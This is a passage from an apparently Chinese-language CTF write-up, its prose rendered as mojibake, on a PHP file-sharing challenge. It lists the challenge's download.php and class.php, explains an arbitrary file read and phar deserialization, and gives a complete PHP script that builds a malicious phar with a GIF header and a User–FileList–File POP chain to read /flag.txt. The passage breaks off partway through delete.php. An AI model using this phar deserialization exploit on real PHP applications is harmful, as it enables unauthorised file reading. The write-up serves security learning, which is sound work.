é™¤æ–‡ä»¶</li></ul><p>æˆ‘ä»¬å‘ç°ä¸‹è½½æ–‡ä»¶å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217102936436.png" alt="image-20241217102936436" style="zoom: 67%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨ä¸€ä¸ªclass.phpæ–‡ä»¶ï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨download.phpä¸­å­˜åœ¨è¿™æ ·çš„ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file-&gt;close();</span><br></pre></td></tr></table></figure><p>è¿™ä¼šè§¦å‘file_get_contentsï¼Œå­˜åœ¨pharååºåˆ—åŒ–ï¼æˆ‘ä»¬åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶ç„¶åä¸‹è½½æ–‡ä»¶æ¥pharä¼ªåè®®å³å¯ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ çš„æ˜¯popé“¾ï¼Œæ„é€ æ¶æ„pharæ–‡ä»¶ã€‚</p><p>è¿™é‡Œè¦æ³¨æ„Fileä¸­åªæ˜¯returnäº†flag.txtçš„å†…å®¹ï¼Œå¹¶æ²¡æœ‰è¾“å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³åŠæ³•å°†å…¶è¾“å‡ºï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span>=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//è®¾ç½®stubï¼Œæ·»åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);  <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">////åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ä¸ºdelete.phpï¼Œåˆ é™¤æ–‡ä»¶æ—¶è§¦å‘unlinkï¼Œä¹Ÿä¼šè§¦å‘pharååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span 